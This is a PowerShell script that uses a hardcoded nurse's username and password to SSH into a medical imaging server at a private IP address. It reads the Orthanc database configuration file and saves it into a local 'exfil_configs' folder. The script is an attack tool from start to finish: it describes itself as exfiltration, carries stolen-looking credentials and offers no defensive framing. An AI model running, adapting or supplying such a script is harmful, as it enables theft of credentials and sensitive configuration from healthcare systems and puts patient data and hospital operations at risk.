
$IMAGING_USER = "nurse.rodriguez"
$IMAGING_PASS = "WitchBeechCellar86"
$IMAGING_HOSTS = @("192.168.1.18")
$TARGET_FILE = "/etc/orthanc/database.conf"
$EXFIL_DIR = ".\exfil_configs"

New-Item -ItemType Directory -Force -Path $EXFIL_DIR | Out-Null

# Download plink if needed
if (-not (Test-Path ".\plink.exe")) {
    Write-Host "[*] Downloading plink.exe..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "plink.exe"
    Write-Host "[+] plink.exe downloaded" -ForegroundColor Green
}

Write-Host "[*] Database Config Exfiltration`n" -ForegroundColor Cyan

foreach ($ip in $IMAGING_HOSTS) {
    $hostIP = $ip.ToString()
    $OUTPUT = Join-Path $EXFIL_DIR "database_${hostIP}.conf"
    Write-Host "[*] Exfiltrating from $hostIP ..." -ForegroundColor Yellow
    
    # Accept host key first time
    $null = echo y | .\plink.exe -ssh -l $IMAGING_USER -pw $IMAGING_PASS $hostIP "echo ok" 2>&1
    
    # Just read the file - no exploit needed!
    $result = .\plink.exe -batch -ssh -l $IMAGING_USER -pw $IMAGING_PASS $hostIP "cat $TARGET_FILE 2>/dev/null" 2>&1
    
    if ($result -and $result.Length -gt 0 -and $result -notmatch "No such file") {
        $result | Out-File -FilePath $OUTPUT -Encoding ASCII
        Write-Host "[+] $hostIP was successful" -ForegroundColor Green
    } else {
        Write-Host "[-] FAILED $hostIP" -ForegroundColor Red
    }
}

Write-Host "`n[*] Exfiltrated configs saved to: $EXFIL_DIR\" -ForegroundColor Cyan
Get-ChildItem $EXFIL_DIR | Format-Table Name, Length, LastWriteTime